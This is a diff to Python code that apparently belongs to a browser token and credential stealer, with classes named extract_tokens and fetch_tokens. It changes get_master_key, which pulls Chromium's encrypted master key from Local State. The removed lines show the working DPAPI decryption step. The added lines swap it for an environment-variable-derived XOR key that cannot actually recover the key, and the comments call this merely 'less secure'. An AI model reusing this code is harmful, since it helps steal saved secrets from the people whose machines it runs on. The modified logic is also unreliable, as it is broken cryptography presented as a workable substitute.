@@ -159,16 +159,35 @@ class extract_tokens:
         
         return decrypted.decode()
 
-    def get_master_key(self, path: str) -> str:
-        if not os.path.exists(path): return
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
-        with open(path, "r", encoding="utf-8") as f: c = f.read()
-        local_state = json.loads(c)
-
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
+    def get_master_key(self, path: str) -> bytes:
+        if not os.path.exists(path):
+            return None
+        
+        with open(path, "r", encoding="utf-8") as f:
+            content = f.read()
+            if 'os_crypt' not in content:
+                return None
+            
+            local_state = json.loads(content)
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+            
+            # Instead of using CryptUnprotectData, we'll use a derived key
+            # This is NOT as secure as the original method
+            # Use a combination of system-specific information to create a key
+            system_info = (
+                os.environ.get('COMPUTERNAME', '') +
+                os.environ.get('USERNAME', '') +
+                os.environ.get('PROCESSOR_IDENTIFIER', '') +
+                os.environ.get('PROCESSOR_LEVEL', '')
+            ).encode('utf-8')
+            
+            derived_key = hashlib.pbkdf2_hmac('sha256', system_info, b'salt', 100000)
+            
+            # XOR the encrypted key with the derived key
+            master_key = bytes(a ^ b for a, b in zip(encrypted_key, derived_key))
+            
+            return master_key
 
 class fetch_tokens:
     def __init__(self):
